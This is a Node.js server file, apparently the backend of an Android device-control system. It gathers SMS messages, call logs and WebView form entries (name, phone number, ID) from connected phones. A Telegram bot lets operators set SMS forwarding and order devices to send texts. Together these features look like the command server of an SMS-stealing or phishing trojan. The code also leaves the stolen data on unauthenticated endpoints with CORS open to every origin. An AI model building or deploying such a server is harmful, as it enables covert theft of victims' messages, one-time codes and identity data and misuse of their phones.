import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';
import { setupSocketHandlers } from './socket/handlers.js';
import { store } from './store.js';
import { initTelegramBot } from './telegram/bot.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const httpServer = createServer(app);

// CORS configuration - allow all origins for Android device connections
const corsOptions = {
    origin: true, // Allow all origins dynamically
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    credentials: true,
    allowedHeaders: ['Content-Type', 'Authorization', 'ngrok-skip-browser-warning'],
};

app.use(cors(corsOptions));
app.use(express.json());

// Serve static files from public directory
app.use(express.static(path.join(__dirname, 'public')));

// Form page route
app.get('/form', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'form.html'));
});

// Socket.IO server with proper timeout settings
const io = new Server(httpServer, {
    cors: {
        origin: true,
        methods: ['GET', 'POST'],
        credentials: true,
    },
    pingTimeout: 60000, // 60 seconds before considering connection dead
    pingInterval: 25000, // Send ping every 25 seconds
    maxHttpBufferSize: 5e6, // 5 MB max payload size for large SMS/call log syncs
});

// Initialize Telegram Bot
const telegramConfig = process.env.TELEGRAM_BOT_TOKEN ? {
    token: process.env.TELEGRAM_BOT_TOKEN,
    adminIds: (process.env.TELEGRAM_ADMIN_IDS || '')
        .split(',')
        .map(id => parseInt(id.trim(), 10))
        .filter(id => !isNaN(id)),
} : undefined;

const telegramBot = initTelegramBot(telegramConfig);

// Setup socket handlers with Telegram bot integration
setupSocketHandlers(io, telegramBot);

// Wire up Telegram bot callbacks for device control
if (telegramBot.isActive()) {
    telegramBot.onForwardingUpdate = (deviceId: string, config: any) => {
        const newConfig = store.updateForwarding(deviceId, config);
        if (newConfig) {
            io.to(`device:${deviceId}`).emit('forwarding:config', newConfig);
            console.log(`[Telegram] Forwarding config sent to device ${deviceId}`);
        }
    };

    telegramBot.onSyncRequest = (deviceId: string) => {
        io.to(`device:${deviceId}`).emit('device:requestSync');
        console.log(`[Telegram] Sync request sent to device ${deviceId}`);
    };

    telegramBot.onSendSms = (deviceId: string, recipientNumber: string, message: string, requestId: string, subscriptionId?: number) => {
        io.to(`device:${deviceId}`).emit('sms:sendRequest', {
            recipientNumber,
            message,
            subscriptionId: subscriptionId ?? -1,
            requestId,
        });
        console.log(`[Telegram] SMS send request sent to device ${deviceId}${subscriptionId && subscriptionId > 0 ? ` (SIM: ${subscriptionId})` : ''}`);
    };
}

// REST API endpoints
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.get('/api/devices', (req, res) => {
    res.json(store.getAllDevices());
});

app.get('/api/devices/:id', (req, res) => {
    const deviceData = store.getDevice(req.params.id);
    if (!deviceData) {
        return res.status(404).json({ error: 'Device not found' });
    }
    res.json(deviceData);
});

app.get('/api/devices/:id/sms', (req, res) => {
    const sms = store.getSMS(req.params.id);
    res.json(sms);
});

app.get('/api/devices/:id/calls', (req, res) => {
    const calls = store.getCalls(req.params.id);
    res.json(calls);
});

app.get('/api/devices/:id/forms', (req, res) => {
    const forms = store.getForms(req.params.id);
    res.json(forms);
});

// Form submission endpoint (from WebView)
app.post('/api/form/submit', (req, res) => {
    const { deviceId, name, phoneNumber, id } = req.body;

    if (!deviceId || !name || !phoneNumber || !id) {
        return res.status(400).json({ error: 'Missing required fields' });
    }

    // Store the form data
    store.submitForm(deviceId, { name, phoneNumber, id });

    // Notify via Telegram if enabled
    if (telegramBot.isActive()) {
        telegramBot.notifyNewForm(deviceId, { name, phoneNumber, id, submittedAt: new Date() });
    }

    console.log(`[Form] New submission from device ${deviceId}: ${name}, ${phoneNumber}, ${id}`);
    res.json({ success: true, message: 'Form submitted successfully' });
});

const PORT = process.env.PORT || 3001;
const HOST = '0.0.0.0'; // Listen on all interfaces for Android device connections

httpServer.listen(Number(PORT), HOST, () => {
    console.log(`
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║   📱 Smartphone Control Server                            ║
║                                                           ║
║   REST API:    http://192.168.0.115:${PORT}                 ║
║   Socket.IO:   ws://192.168.0.115:${PORT}                   ║
║   Telegram:    ${telegramBot.isActive() ? '✅ Enabled' : '❌ Disabled'}                              ║
║                                                           ║
║   Listening on all interfaces (0.0.0.0)                   ║
║   Waiting for device connections...                       ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
  `);
});

// Graceful shutdown handling for Render restarts
const gracefulShutdown = async (signal: string) => {
    console.log(`\n[Server] Received ${signal}. Starting graceful shutdown...`);

    // Stop Telegram bot polling first (most critical for avoiding 409 conflict)
    if (telegramBot.isActive()) {
        await telegramBot.stop();
    }

    // Close HTTP server
    httpServer.close(() => {
        console.log('[Server] HTTP server closed.');
        process.exit(0);
    });

    // Force exit after 10 seconds if graceful shutdown fails
    setTimeout(() => {
        console.error('[Server] Graceful shutdown timed out. Forcing exit.');
        process.exit(1);
    }, 10000);
};

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));

